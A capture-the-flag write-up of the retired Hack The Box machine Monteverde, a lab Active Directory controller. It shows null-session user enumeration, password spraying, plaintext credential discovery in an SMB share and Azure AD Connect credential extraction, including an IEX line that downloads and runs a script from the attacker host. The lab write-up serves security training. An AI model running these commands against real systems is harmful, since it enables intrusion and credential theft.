# Monteverde

This is the write-up for the box Monteverde that got retired at the 13th June 2020.
My IP address was 10.10.14.11 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.172    monteverde.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/monteverde.nmap 10.10.10.172
```

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-03-21 12:35:24Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows
```

This box seems to be an **Active Directory domain controller** and the hostname _megabank.local_ should be put into the _/etc/hosts_ file.

## Checking RPC (Port 135)

Checking if RPC is configured to accept **null authentication**:
```
rpcclient -U '' 10.10.10.172
```

Without entering a password, authentication to the RPC client works and can be used to enumerate valuable information.

List all users and create a wordlist with them:
```
rpcclient $> enumdomusers
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

The user _AAD_987d7f2f57d2_ is especially interesting as this is a user for synchronizing passwords between **on-premise Active Directory** and **Azure Active Directory**.

Trying to guess the passwords of the users with a **Password Spraying attack** and using the own usernames as the password:
```
crackmapexec smb 10.10.10.172 -u users.list -p users.list
```

There was one successful hit on the user _SABatchJobs_ that uses the username as the password.

## Checking SMB (Port 445)

Checking which SMB shares the user _SABatchJobs_ has access to with **Smbmap**:
```
smbmap -u SABatchJobs -p SABatchJobs -H 10.10.10.172
```
```
Disk            Permissions     Comment
----            -----------     -------
ADMIN$          NO ACCESS       Remote Admin
azure_uploads   READ ONLY
C$              NO ACCESS       Default share
E$              NO ACCESS       Default share
IPC$            READ ONLY       Remote IPC
NETLOGON        READ ONLY       Logon server share
SYSVOL          READ ONLY       Logon server share
users$          READ ONLY
```

List contents of all accessible shares recursively:
```
smbmap -u SABatchJobs -p SABatchJobs -H 10.10.10.172 -R
```

In the _users_ share are four directories and in the directory of _mhope_ is a file called _azure.xml_.
Lets download that file to our box:
```
smbclient -U SABatchJobs //10.10.10.172/users$

smb: \> cd mhope\
smb: \mhope\> get azure.xml
```

The _azure.xml_ file has a password in it:
```
(...)
<S N="Password">4n0therD4y@n0th3r$</S>
(...)
```

Testing to which user this password belongs to:
```
crackmapexec smb 10.10.10.172 -u users.list -p '4n0therD4y@n0th3r$'
```
```
crackmapexec winrm 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'
```

The user _mhope_ comes back successfully and also has permission to start a **WinRM** connection:
```
evil-winrm -u mhope -p '4n0therD4y@n0th3r$' -i 10.10.10.172
```

This starts a shell session on the box as _mhope_.

## Privilege Escalation

To get an attack surface on the box, it is recommended to run any **Windows Enumeration script**:
```
curl 10.10.14.11:8000/winPEAS.exe -o winPEAS.exe

.\winPEAS.exe
```

On the box is **Azure AD Connect** installed, which is a service to synchronize passwords between **on-premise Active Directory** and **Azure Active Directory**.
This user is also a member of the group _Azure Admins_ and thus has access to the Azure database.

In this [article of XPN Sec](https://blog.xpnsec.com/azuread-connect-for-redteam/) the way to get information out of the database is described.

The _SQL server command line tool_ `sqlcmd` is by default on this box and can be used to access the databases:
```
sqlcmd -Q "select name,create_date from sys.databases"
```
```
name          create_date
-------------------------------------
master        2003-04-08 09:13:36.390
tempdb        2021-03-21 04:10:35.617
model         2003-04-08 09:13:36.390
msdb          2017-08-22 19:39:22.887
ADSync        2020-01-02 14:53:29.783
```

The database _ADSync_ contains the information we want to extract:
```
sqlcmd -Q "Use ADSync; select private_configuration_xml,encrypted_configuration from mms_management_agent"
```

It outputs an encrypted password:
```
(...)
<forest-login-user>administrator</forest-login-user>
<forest-login-domain>MEGABANK.LOCAL 8AAAAAgAAABQhCBBnwTpdfQE6uNJeJWGjvps08skADOJDqM74hw39rVWMWrQukLAEYpfquk2CglqHJ3GfxzNWlt9+ga+2wmWA0zHd3uGD8vk/vfnsF3p2aKJ7n9IAB51xje0QrDLNdOqOxod8n7VeybNW/1k+YWuYkiED3xO8Pye72i6D9c5QTzjTlXe5qgd4TCdp4fmVd+UlL/dWT/mhJHve/d9zFr2EX5r5+1TLbJCzYUHqFLvvpCd1rJEr68g
```

Before running the [PowerShell script from XPN Sec](https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c) to decrypt the password, it has to be modified accordingly or it will crash:

Changing the third line in the script to connect to _localhost_:
```
Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"

$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=localhost;Integrated Security=true;Initial Catalog=ADSync"
(...)
```

Uploading and executing the script on the box:
```
IEX(New-Object Net.WebClient).downloadString("http://10.10.14.11:8000/azuread_decrypt_msol_v2.ps1")
```

After executing, it will output the password of _administrator_:
```
Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```

Starting a shell with **impacket-psexec**:
```
impacket-psexec administrator@10.10.10.172
```

It works and starts a shell as _NT Authority\SYSTEM_!
